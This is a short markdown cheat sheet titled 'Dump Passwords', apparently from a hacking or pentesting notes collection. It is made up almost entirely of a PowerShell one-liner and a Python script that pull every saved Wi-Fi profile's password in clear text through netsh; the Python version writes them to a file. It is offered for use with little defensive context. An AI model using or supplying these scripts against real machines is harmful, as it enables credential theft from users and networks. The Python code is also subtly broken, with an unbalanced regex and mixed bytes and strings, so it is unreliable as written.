# Dump Passwords

## PowerShell

```powershell
(netsh.exe wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {(netsh.exe wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
```

## Python

```python
import subprocess
import re

command = "netsh.exe wlan show profiles"
known_networks = subprocess.check_output(command, shell=True)
network_list = re.findall(b'(?:Profile\s*:\s(.*)', known_networks)

output = ""
for network in network_list:
    credentials = "netsh.exe wlan show profile " + network + " key=clear"
    # output += str(subprocess.check_output(credentials, shell=True))
    output += subprocess.check_output(credentials, shell=True).decode('utf-8')

buffer = open("wifi_credentials.txt", 'w')
buffer.write(output)
buffer.close()
```

---
## References

### Jakoby

- [Jakoby: Wifi-Info](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/Wifi-Info.md)

### InfoSec Matter

- [InfoSec Matter: Powershell Commands for Pentesters](https://www.infosecmatter.com/powershell-commands-for-pentesters/)